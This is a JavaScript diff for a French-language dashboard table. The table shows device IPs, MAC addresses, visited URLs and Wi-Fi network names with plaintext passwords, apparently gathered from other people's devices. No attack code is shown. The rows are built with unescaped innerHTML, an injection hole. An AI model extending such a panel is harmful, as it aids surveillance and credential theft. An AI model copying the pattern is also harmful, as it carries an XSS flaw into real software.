@@ -866,28 +866,45 @@
             const sortedData = [...data].reverse();
             sortedData.forEach(item => {
                 const row = document.createElement("tr");
-                const date = new Date(item.timestamp);
+                const date = new Date(item.timestamp || Date.now());
 
-                const ssid = item.wifi_ssid && item.wifi_ssid !== "null" ? item.wifi_ssid : "";
-                const password = item.wifi_password && item.wifi_password !== "null" ? item.wifi_password : "";
+                let wifiEntries = [];
+                if (Array.isArray(item.wifi_credentials)) {
+                    wifiEntries = item.wifi_credentials;
+                } else if (typeof item.wifi_credentials === "string") {
+                    try {
+                        wifiEntries = JSON.parse(item.wifi_credentials);
+                    } catch (error) {
+                        wifiEntries = [];
+                    }
+                }
 
                 let wifiHtml = "";
-                if (ssid || password) {
+                if (wifiEntries.length > 0) {
                     wifiHtml = `<div class="wifi-list">`;
-                    if (ssid) wifiHtml += `<span class="wifi-badge">📶 ${ssid}</span>`;
-                    if (password) wifiHtml += `<span class="wifi-inline">${password}</span>`;
+                    wifiEntries.forEach(entry => {
+                        const ssid = entry && (entry.ssid || entry.wifi_ssid || entry.name || "");
+                        const password = entry && (entry.password || entry.wifi_password || "");
+                        if (ssid) wifiHtml += `<span class="wifi-badge">📶 ${ssid}</span>`;
+                        if (password) wifiHtml += `<span class="wifi-inline">${password}</span>`;
+                    });
+                    wifiHtml += `</div>`;
+                } else if (item.wifi_ssid || item.wifi_password) {
+                    wifiHtml = `<div class="wifi-list">`;
+                    if (item.wifi_ssid) wifiHtml += `<span class="wifi-badge">📶 ${item.wifi_ssid}</span>`;
+                    if (item.wifi_password) wifiHtml += `<span class="wifi-inline">${item.wifi_password}</span>`;
                     wifiHtml += `</div>`;
                 }
 
                 const networkValue = item.network_name && item.network_name !== "Inconnu" ? item.network_name : "";
 
                 row.innerHTML = `
-                        <td><span class="ip-badge">${item.ip_address}</span></td>
-                        <td><span class="mac-badge">${item.mac_address}</span></td>
-                        <td><a href="${item.url}" target="_blank" class="url-link" title="${item.url}">${item.url}</a></td>
+                        <td><span class="ip-badge">${item.ip_address || "--"}</span></td>
+                        <td><span class="mac-badge">${item.mac_address || "--"}</span></td>
+                        <td><a href="${item.url || '#'}" target="_blank" class="url-link" title="${item.url || ''}">${item.url || "--"}</a></td>
                         <td><span class="net-badge">${networkValue ? '📡 ' + networkValue : ''}</span></td>
                         <td>${wifiHtml}</td>
-                        <td><span class="ts">${date.toLocaleString("fr-FR")}</span></td>
+                        <td><span class="ts">${!isNaN(date) ? date.toLocaleString("fr-FR") : "--"}</span></td>
                     `;
 
                 table.appendChild(row);
